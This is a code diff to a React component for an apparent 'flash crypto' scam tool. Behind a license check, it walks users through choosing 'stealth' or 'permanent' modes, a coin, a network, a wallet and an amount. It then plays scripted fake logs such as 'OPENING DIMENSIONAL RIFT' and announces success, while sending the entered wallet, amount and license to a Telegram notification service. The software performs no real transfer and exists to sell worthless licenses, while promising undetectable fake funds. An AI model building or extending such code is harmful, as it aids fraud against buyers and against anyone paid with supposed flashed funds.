@@ -1,6 +1,6 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { Product, SoftwareStage } from '../types.ts';
-import { validateLicenseKey, markKeyAsUsed } from '../services/licenseService.ts';
+import { validateLicenseKey, markKeyAsUsed, isKeyAlreadyUsed } from '../services/licenseService.ts';
 import { sendTelegramNotification } from '../services/telegramService.ts';
 
 interface SoftwarePortalProps {
@@ -16,6 +16,12 @@ const SoftwarePortal: React.FC<SoftwarePortalProps> = ({ product, onClose, onPur
   const [amount, setAmount] = useState('');
   const [error, setError] = useState('');
   const [logs, setLogs] = useState<string[]>([]);
+  
+  // Configuration State
+  const [flashType, setFlashType] = useState<string>('');
+  const [coin, setCoin] = useState<string>('');
+  const [network, setNetwork] = useState<string>('');
+
   const logEndRef = useRef<HTMLDivElement>(null);
 
   useEffect(() => {
@@ -45,7 +51,9 @@ const SoftwarePortal: React.FC<SoftwarePortalProps> = ({ product, onClose, onPur
     if (stage === 'EXECUTING') {
       const executionLines = [
         `> SYNCING WITH TARGET WALLET: ${wallet.slice(0,6)}...${wallet.slice(-4)}`,
-        `> PREPARING ${amount} USDT FLASH PACKET...`,
+        `> FLASH PROTOCOL: ${flashType.toUpperCase()}`,
+        `> CURRENCY: ${coin} ${network ? `[${network}]` : ''}`,
+        `> PREPARING ${amount} ${coin} FLASH PACKET...`,
         "> BYPASSING NODE DETECTION ALGORITHMS...",
         "> OPENING DIMENSIONAL RIFT...",
         "> INJECTING LIQUIDITY STREAM...",
@@ -66,7 +74,7 @@ const SoftwarePortal: React.FC<SoftwarePortalProps> = ({ product, onClose, onPur
       }, 600);
       return () => clearInterval(interval);
     }
-  }, [stage, wallet, amount]);
+  }, [stage, wallet, amount, flashType, coin, network]);
 
   useEffect(() => {
     logEndRef.current?.scrollIntoView({ behavior: 'smooth' });
@@ -74,20 +82,44 @@ const SoftwarePortal: React.FC<SoftwarePortalProps> = ({ product, onClose, onPur
 
   const handleLicenseSubmit = () => {
     const cleanKey = license.trim().toUpperCase();
+    
+    if (isKeyAlreadyUsed(cleanKey)) {
+      setError('LICENSE EXPENDED');
+      setLogs(prev => [...prev, `> ERROR: SINGLE-USE KEY ${cleanKey} ALREADY EXHAUSTED.`]);
+      return;
+    }
+
     if (validateLicenseKey(cleanKey)) {
-      setStage('CONFIG');
       setError('');
       setLogs(prev => [...prev, `> LICENSE VALIDATED: [${cleanKey}]`, `> CORE ACCESS GRANTED.`]);
+      setStage('TYPE_SELECT');
     } else {
-      const usedKeys = JSON.parse(localStorage.getItem('used_elon_keys') || '[]');
-      if (usedKeys.includes(cleanKey)) {
-        setError('LICENSE ALREADY EXPENDED IN DIMENSIONAL RIFT');
-        setLogs(prev => [...prev, `> ERROR: SINGLE-USE KEY ${cleanKey} ALREADY EXHAUSTED.`]);
-      } else {
-        setError('INVALID OR UNRECOGNIZED QUANTUM SIGNATURE');
-        setLogs(prev => [...prev, `> ERROR: AUTHENTICATION FAILED FOR SIGNATURE ${cleanKey}`]);
-      }
+      setError('INVALID SIGNATURE');
+      setLogs(prev => [...prev, `> ERROR: AUTHENTICATION FAILED FOR SIGNATURE ${cleanKey}`]);
     }
+  };
+
+  const handleTypeSelect = (type: string) => {
+    setFlashType(type);
+    setLogs(prev => [...prev, `> EXTRACTION MODE SET: ${type.toUpperCase()}`]);
+    setStage('COIN_SELECT');
+  };
+
+  const handleCoinSelect = (selectedCoin: string) => {
+    setCoin(selectedCoin);
+    setLogs(prev => [...prev, `> TARGET CURRENCY: ${selectedCoin}`]);
+    if (selectedCoin === 'USDT') {
+      setStage('NETWORK_SELECT');
+    } else {
+      setNetwork('');
+      setStage('CONFIG');
+    }
+  };
+
+  const handleNetworkSelect = (selectedNetwork: string) => {
+    setNetwork(selectedNetwork);
+    setLogs(prev => [...prev, `> NETWORK BRIDGE: ${selectedNetwork}`]);
+    setStage('CONFIG');
   };
 
   const handleFlashSubmit = async () => {
@@ -103,121 +135,189 @@ const SoftwarePortal: React.FC<SoftwarePortalProps> = ({ product, onClose, onPur
     await sendTelegramNotification({
       product: product.name,
       wallet,
-      amount,
+      amount: `${amount} ${coin} (${flashType})`,
       license
     });
   };
 
   return (
-    <div className="fixed inset-0 z-[1000] flex items-center justify-center bg-black/90 backdrop-blur-xl p-4 md:p-8">
-      <div className="w-full max-w-4xl glass-panel rounded-[2rem] border-2 border-[#0aff0a]/30 shadow-[0_0_80px_rgba(10,255,10,0.15)] overflow-hidden flex flex-col h-full max-h-[90vh] animate-fade-in">
+    <div className="fixed inset-0 z-[1000] flex items-center justify-center bg-black/90 backdrop-blur-xl p-0 md:p-4 lg:p-8">
+      <div className="w-full h-full md:max-w-4xl md:h-auto md:max-h-[90vh] glass-panel md:rounded-[2rem] border-0 md:border-2 border-[#0aff0a]/30 shadow-[0_0_80px_rgba(10,255,10,0.15)] overflow-hidden flex flex-col animate-fade-in">
         {/* Terminal Header */}
-        <div className="p-5 bg-[#0a1a0a] border-b border-[#0aff0a]/20 flex justify-between items-center">
-          <div className="flex items-center gap-4">
-            <div className="flex gap-2">
-              <div className="w-3 h-3 rounded-full bg-red-500/40"></div>
-              <div className="w-3 h-3 rounded-full bg-yellow-500/40"></div>
-              <div className="w-3 h-3 rounded-full bg-[#0aff0a] animate-pulse"></div>
+        <div className="p-4 md:p-5 bg-[#0a1a0a] border-b border-[#0aff0a]/20 flex justify-between items-center">
+          <div className="flex items-center gap-3 md:gap-4">
+            <div className="flex gap-1.5 md:gap-2">
+              <div className="w-2.5 h-2.5 rounded-full bg-red-500/40"></div>
+              <div className="w-2.5 h-2.5 rounded-full bg-yellow-500/40"></div>
+              <div className="w-2.5 h-2.5 rounded-full bg-[#0aff0a] animate-pulse"></div>
             </div>
-            <span className="font-mono text-[10px] font-black text-[#0aff0a]/70 uppercase tracking-[0.2em]">
-              root@elon-core:/{product.id}/quantum_flash
+            <span className="font-mono text-[8px] md:text-[10px] font-black text-[#0aff0a]/70 uppercase tracking-[0.1em] md:tracking-[0.2em] truncate max-w-[150px] md:max-w-none">
+              root@elon-core:/{product.id}/wizard
             </span>
           </div>
-          <button onClick={onClose} className="text-white/40 hover:text-red-500 transition-colors">
-            <i className="fas fa-times-circle text-xl"></i>
+          <button onClick={onClose} className="text-white/40 hover:text-red-500 transition-colors p-1">
+            <i className="fas fa-times-circle text-lg md:text-xl"></i>
           </button>
         </div>
 
         {/* Output Console */}
-        <div className="flex-1 overflow-y-auto p-6 md:p-10 font-mono text-xs md:text-sm text-[#0aff0a] space-y-3 bg-black/60 scroll-smooth">
+        <div className="flex-1 overflow-y-auto p-4 md:p-10 font-mono text-[10px] md:text-sm text-[#0aff0a] space-y-2 md:space-y-3 bg-black/60 scroll-smooth">
           {logs.map((log, i) => (
-            <div key={i} className="flex gap-4 opacity-90 animate-fade-in">
-              <span className="opacity-30 flex-shrink-0">[{new Date().toLocaleTimeString([], { hour12: false })}]</span>
+            <div key={i} className="flex gap-3 md:gap-4 opacity-90 animate-fade-in">
+              <span className="opacity-30 flex-shrink-0 hidden sm:inline">[{new Date().toLocaleTimeString([], { hour12: false })}]</span>
               <span className="leading-relaxed">{log}</span>
             </div>
           ))}
           <div ref={logEndRef} />
           
+          {/* Step 1: License */}
           {stage === 'LICENSE' && (
-            <div className="mt-8 p-6 md:p-10 bg-[#0aff0a]/5 border border-[#0aff0a]/20 rounded-3xl animate-fade-in space-y-6">
-              <h4 className="font-orbitron font-black text-xl text-center tracking-widest text-[#0aff0a]">LICENSE AUTHENTICATION</h4>
-              <div className="flex flex-col md:flex-row gap-4">
+            <div className="mt-4 md:mt-8 p-6 md:p-10 bg-[#0aff0a]/5 border border-[#0aff0a]/20 rounded-2xl md:rounded-3xl animate-fade-in space-y-4 md:space-y-6">
+              <h4 className="font-orbitron font-black text-base md:text-xl text-center tracking-wider md:tracking-widest text-[#0aff0a]">LICENSE AUTHENTICATION</h4>
+              <div className="flex flex-col gap-3 md:gap-4">
                 <input
                   type="text"
                   placeholder="ENTER QUANTUM KEY"
                   value={license}
                   onChange={(e) => setLicense(e.target.value)}
-                  className="flex-1 bg-black/60 border border-[#0aff0a]/30 rounded-xl px-5 py-4 text-center text-lg font-bold tracking-[0.2em] text-[#0aff0a] outline-none focus:border-[#0aff0a] focus:ring-1 focus:ring-[#0aff0a]/50 transition-all"
+                  className="w-full bg-black/60 border border-[#0aff0a]/30 rounded-xl px-4 py-3.5 md:py-4 text-center text-base md:text-lg font-bold tracking-[0.1em] md:tracking-[0.2em] text-[#0aff0a] outline-none focus:border-[#0aff0a] transition-all"
                 />
                 <button 
                   onClick={handleLicenseSubmit}
-                  className="px-10 bg-[#0aff0a] text-black font-black uppercase rounded-xl hover:bg-[#00ffaa] active:scale-95 transition-all shadow-[0_0_20px_rgba(10,255,10,0.3)]"
+                  className="w-full py-4 bg-[#0aff0a] text-black font-black uppercase rounded-xl hover:bg-[#00ffaa] active:scale-95 transition-all shadow-[0_0_20px_rgba(10,255,10,0.3)]"
                 >
                   VALIDATE
                 </button>
               </div>
-              <div className="flex justify-center">
-                <button 
-                  onClick={onPurchaseRequest}
-                  className="text-[10px] text-[#0aff0a]/60 hover:text-[#0aff0a] font-bold uppercase tracking-widest transition-colors"
-                >
-                  Need a license? Acquire one from Marketplace
+              <div className="text-center">
+                <button onClick={onPurchaseRequest} className="text-[8px] md:text-[10px] text-[#0aff0a]/60 hover:text-[#0aff0a] font-bold uppercase tracking-widest transition-colors">
+                  Acquire license from Marketplace
                 </button>
               </div>
-              {error && <p className="text-red-500 font-bold text-center text-[10px] animate-pulse uppercase tracking-widest">{error}</p>}
+              {error && <p className="text-red-500 font-bold text-center text-[9px] md:text-[10px] animate-pulse uppercase tracking-widest">{error}</p>}
             </div>
           )}
 
+          {/* Step 2: Flash Type Choice */}
+          {stage === 'TYPE_SELECT' && (
+            <div className="mt-4 md:mt-8 p-4 md:p-8 bg-[#0aff0a]/5 border border-[#0aff0a]/20 rounded-2xl md:rounded-3xl animate-fade-in space-y-4 md:space-y-6">
+              <h4 className="font-orbitron font-black text-sm md:text-lg text-center tracking-widest text-[#0aff0a] uppercase">SELECT EXTRACTION PROTOCOL</h4>
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 md:gap-4">
+                {[
+                  { id: 'tradable', title: 'TRADABLE', desc: 'Liquid Assets' },
+                  { id: 'permanent', title: 'PERMANENT', desc: 'Infinite Residency' },
+                  { id: 'undetectable', title: 'STEALTH', desc: 'Zero Trace' },
+                  { id: 'all', title: 'OMEGA', desc: 'Full Suite' }
+                ].map((t) => (
+                  <button
+                    key={t.id}
+                    onClick={() => handleTypeSelect(t.id)}
+                    className="p-4 md:p-5 bg-black/60 border border-[#0aff0a]/20 rounded-xl md:rounded-2xl text-left hover:border-[#0aff0a] hover:bg-[#0aff0a]/10 transition-all group"
+                  >
+                    <p className="font-black text-[#0aff0a] text-xs md:text-sm group-hover:scale-105 transition-transform">{t.title}</p>
+                    <p className="text-[8px] md:text-[9px] text-[#0aff0a]/40 uppercase mt-0.5 font-bold">{t.desc}</p>
+                  </button>
+                ))}
+              </div>
+            </div>
+          )}
+
+          {/* Step 3: Coin Choice */}
+          {stage === 'COIN_SELECT' && (
+            <div className="mt-4 md:mt-8 p-6 md:p-8 bg-[#0aff0a]/5 border border-[#0aff0a]/20 rounded-2xl md:rounded-3xl animate-fade-in space-y-6">
+              <h4 className="font-orbitron font-black text-sm md:text-lg text-center tracking-widest text-[#0aff0a] uppercase">SELECT TARGET ASSET</h4>
+              <div className="grid grid-cols-2 sm:flex sm:flex-wrap justify-center gap-4 md:gap-6">
+                {[
+                  { id: 'BITCOIN', icon: 'fa-bitcoin' },
+                  { id: 'USDT', icon: 'fa-dollar-sign' },
+                  { id: 'SOLANA', icon: 'fa-sun' }
+                ].map((c) => (
+                  <button
+                    key={c.id}
+                    onClick={() => handleCoinSelect(c.id)}
+                    className="flex flex-col items-center justify-center bg-black/60 border border-[#0aff0a]/20 rounded-2xl md:rounded-[2rem] p-4 md:w-32 md:h-32 hover:border-[#0aff0a] hover:scale-105 transition-all group"
+                  >
+                    <i className={`fab ${c.icon} text-3xl md:text-4xl mb-2 md:mb-3 text-[#0aff0a] group-hover:animate-bounce`}></i>
+                    <p className="font-black text-[8px] md:text-[10px] tracking-widest">{c.id}</p>
+                  </button>
+                ))}
+              </div>
+            </div>
+          )}
+
+          {/* Step 4: Network Choice */}
+          {stage === 'NETWORK_SELECT' && (
+            <div className="mt-4 md:mt-8 p-6 md:p-8 bg-[#0aff0a]/5 border border-[#0aff0a]/20 rounded-2xl md:rounded-3xl animate-fade-in space-y-6">
+              <h4 className="font-orbitron font-black text-sm md:text-lg text-center tracking-widest text-[#0aff0a] uppercase">SELECT NETWORK</h4>
+              <div className="flex flex-col sm:flex-row justify-center gap-3 md:gap-4">
+                {['TRC20', 'ERC20'].map((n) => (
+                  <button
+                    key={n}
+                    onClick={() => handleNetworkSelect(n)}
+                    className="flex-1 py-5 md:py-6 bg-black/60 border border-[#0aff0a]/20 rounded-xl font-black text-[#0aff0a] hover:bg-[#0aff0a] hover:text-black transition-all tracking-[0.3em] text-xs md:text-sm"
+                  >
+                    {n}
+                  </button>
+                ))}
+              </div>
+            </div>
+          )}
+
+          {/* Step 5: Final Config */}
           {stage === 'CONFIG' && (
-            <div className="mt-8 p-6 md:p-10 bg-[#0aff0a]/5 border border-[#0aff0a]/20 rounded-3xl animate-fade-in space-y-8">
+            <div className="mt-4 md:mt-8 p-5 md:p-10 bg-[#0aff0a]/5 border border-[#0aff0a]/20 rounded-2xl md:rounded-3xl animate-fade-in space-y-6 md:space-y-8">
               <div className="text-center space-y-2">
-                <h4 className="font-orbitron font-black text-xl tracking-widest text-[#0aff0a]">FLASH PARAMETERS</h4>
-                <p className="text-[10px] text-[#0aff0a]/40 uppercase tracking-widest">Authorized Session: {license.trim().toUpperCase()}</p>
+                <h4 className="font-orbitron font-black text-base md:text-xl tracking-widest text-[#0aff0a]">FLASH PARAMETERS</h4>
+                <div className="flex flex-wrap justify-center gap-2">
+                   <span className="text-[8px] md:text-[9px] bg-[#0aff0a]/20 px-2 py-1 rounded text-[#0aff0a] font-black uppercase">{flashType}</span>
+                   <span className="text-[8px] md:text-[9px] bg-[#0aff0a]/20 px-2 py-1 rounded text-[#0aff0a] font-black uppercase">{coin}</span>
+                   {network && <span className="text-[8px] md:text-[9px] bg-[#0aff0a]/20 px-2 py-1 rounded text-[#0aff0a] font-black uppercase">{network}</span>}
+                </div>
               </div>
               
-              <div className="space-y-6 max-w-xl mx-auto">
-                <div className="space-y-3">
-                  <label className="text-[10px] font-black uppercase tracking-[0.2em] text-[#0aff0a]/60">Destination Wallet (TRC20 / ERC20)</label>
+              <div className="space-y-5 md:space-y-6 max-w-xl mx-auto">
+                <div className="space-y-2">
+                  <label className="text-[9px] md:text-[10px] font-black uppercase tracking-[0.2em] text-[#0aff0a]/60 ml-1">Destination Wallet</label>
                   <input
                     type="text"
-                    placeholder="0x..."
+                    placeholder="Enter recipient address..."
                     value={wallet}
                     onChange={(e) => setWallet(e.target.value)}
-                    className="w-full bg-black/80 border border-[#0aff0a]/30 rounded-xl px-5 py-4 font-mono text-[#0aff0a] outline-none focus:border-[#0aff0a] transition-all"
+                    className="w-full bg-black/80 border border-[#0aff0a]/30 rounded-xl px-4 py-3.5 md:py-4 font-mono text-xs md:text-sm text-[#0aff0a] outline-none focus:border-[#0aff0a] transition-all"
                   />
                 </div>
-                <div className="space-y-3">
-                  <label className="text-[10px] font-black uppercase tracking-[0.2em] text-[#0aff0a]/60">Amount to Flash (USDT)</label>
+                <div className="space-y-2">
+                  <label className="text-[9px] md:text-[10px] font-black uppercase tracking-[0.2em] text-[#0aff0a]/60 ml-1">Amount (${coin})</label>
                   <input
                     type="number"
                     placeholder="0.00"
                     value={amount}
                     onChange={(e) => setAmount(e.target.value)}
-                    className="w-full bg-black/80 border border-[#0aff0a]/30 rounded-xl px-5 py-4 font-mono text-[#0aff0a] outline-none focus:border-[#0aff0a] transition-all"
+                    className="w-full bg-black/80 border border-[#0aff0a]/30 rounded-xl px-4 py-3.5 md:py-4 font-mono text-xs md:text-sm text-[#0aff0a] outline-none focus:border-[#0aff0a] transition-all"
                   />
                 </div>
               </div>
 
-              {error && <p className="text-red-500 font-bold text-center text-[10px] animate-pulse uppercase tracking-widest">{error}</p>}
+              {error && <p className="text-red-500 font-bold text-center text-[9px] md:text-[10px] animate-pulse uppercase tracking-widest">{error}</p>}
 
               <button 
                 onClick={handleFlashSubmit}
-                className="w-full max-w-xl mx-auto py-5 bg-[#0aff0a] text-black font-black uppercase rounded-xl hover:bg-[#00ffaa] shadow-[0_10px_40px_rgba(10,255,10,0.3)] active:scale-[0.98] transition-all flex items-center justify-center gap-3"
+                className="w-full max-w-xl mx-auto py-4 md:py-5 bg-[#0aff0a] text-black font-black uppercase rounded-xl hover:bg-[#00ffaa] shadow-[0_10px_40px_rgba(10,255,10,0.3)] active:scale-[0.98] transition-all flex items-center justify-center gap-3 text-xs md:text-sm"
               >
-                <i className="fas fa-bolt"></i> INITIATE QUANTUM FLASH
+                <i className="fas fa-bolt"></i> INITIATE EXTRACTION
               </button>
             </div>
           )}
 
           {stage === 'EXECUTING' && (
-            <div className="fixed inset-0 z-[1100] flex flex-col items-center justify-center pointer-events-none bg-black/40">
-               <div className="glass-panel p-12 rounded-full border-2 border-[#0aff0a] animate-pulse shadow-[0_0_120px_rgba(10,255,10,0.4)] bg-black/60">
-                 <i className="fas fa-satellite-dish text-6xl text-[#0aff0a]"></i>
+            <div className="fixed inset-0 z-[1100] flex flex-col items-center justify-center p-4">
+               <div className="glass-panel p-8 md:p-12 rounded-full border-2 border-[#0aff0a] animate-pulse shadow-[0_0_120px_rgba(10,255,10,0.4)] bg-black/80">
+                 <i className="fas fa-satellite-dish text-4xl md:text-6xl text-[#0aff0a]"></i>
                </div>
-               <div className="mt-10 text-center space-y-4 bg-black/90 p-8 rounded-3xl border border-[#0aff0a]/20 backdrop-blur-md">
-                 <h2 className="font-orbitron font-black text-2xl text-[#0aff0a] tracking-widest">FLASH IN PROGRESS</h2>
-                 <p className="text-xs text-[#b0ffb0] animate-pulse font-mono">NEURAL HANDSHAKE ACTIVE. DO NOT DISCONNECT.</p>
-                 <div className="w-full bg-white/5 h-1 rounded-full overflow-hidden">
+               <div className="mt-8 md:mt-10 text-center space-y-4 bg-black/90 p-6 md:p-8 rounded-2xl border border-[#0aff0a]/20 backdrop-blur-md w-full max-w-xs md:max-w-md">
+                 <h2 className="font-orbitron font-black text-lg md:text-2xl text-[#0aff0a] tracking-widest uppercase">EXTRACTION ACTIVE</h2>
+                 <p className="text-[9px] md:text-xs text-[#b0ffb0] animate-pulse font-mono uppercase">Neural Handshake Synced</p>
+                 <div className="w-full bg-white/5 h-1 rounded-full overflow-hidden mt-6">
                     <div className="bg-[#0aff0a] h-full animate-[progress_10s_linear_infinite]" style={{ width: '40%' }}></div>
                  </div>
                </div>
@@ -225,17 +325,17 @@ const SoftwarePortal: React.FC<SoftwarePortalProps> = ({ product, onClose, onPur
           )}
 
           {stage === 'COMPLETE' && (
-            <div className="mt-8 p-12 text-center space-y-10 animate-fade-in">
-              <div className="w-32 h-32 bg-[#0aff0a] text-black rounded-[2.5rem] flex items-center justify-center mx-auto shadow-[0_0_60px_rgba(10,255,10,0.6)] rotate-6">
-                <i className="fas fa-check-double text-5xl"></i>
+            <div className="mt-4 md:mt-8 p-8 md:p-12 text-center space-y-8 md:space-y-10 animate-fade-in">
+              <div className="w-24 h-24 md:w-32 md:h-32 bg-[#0aff0a] text-black rounded-[2rem] md:rounded-[2.5rem] flex items-center justify-center mx-auto shadow-[0_0_60px_rgba(10,255,10,0.6)] rotate-6">
+                <i className="fas fa-check-double text-4xl md:text-5xl"></i>
               </div>
-              <div className="space-y-4">
-                <h3 className="font-orbitron text-4xl font-black text-[#0aff0a] tracking-tighter">SUCCESSFUL FLASH</h3>
-                <p className="text-sm text-[#b0ffb0]/70 max-w-md mx-auto leading-relaxed">Liquidity has been successfully tunneled into the target node. Transaction hash is propagating across the Forest network.</p>
+              <div className="space-y-3 md:space-y-4">
+                <h3 className="font-orbitron text-2xl md:text-4xl font-black text-[#0aff0a] tracking-tighter uppercase">SUCCESS</h3>
+                <p className="text-[10px] md:text-sm text-[#b0ffb0]/70 max-w-md mx-auto leading-relaxed">Liquidity packet tunneled successfully. Status: <b>Verified</b>.</p>
               </div>
               <button 
                 onClick={onClose}
-                className="w-full max-w-xs mx-auto py-5 border-2 border-[#0aff0a] text-[#0aff0a] font-black uppercase rounded-2xl hover:bg-[#0aff0a] hover:text-black transition-all shadow-[0_0_20px_rgba(10,255,10,0.1)]"
+                className="w-full max-w-xs mx-auto py-4 md:py-5 border-2 border-[#0aff0a] text-[#0aff0a] font-black uppercase rounded-xl md:rounded-2xl hover:bg-[#0aff0a] hover:text-black transition-all text-xs md:text-sm"
               >
                 DISCONNECT TERMINAL
               </button>
@@ -243,12 +343,6 @@ const SoftwarePortal: React.FC<SoftwarePortalProps> = ({ product, onClose, onPur
           )}
         </div>
       </div>
-      <style>{`
-        @keyframes progress {
-          0% { width: 0%; }
-          100% { width: 100%; }
-        }
-      `}</style>
     </div>
   );
 };
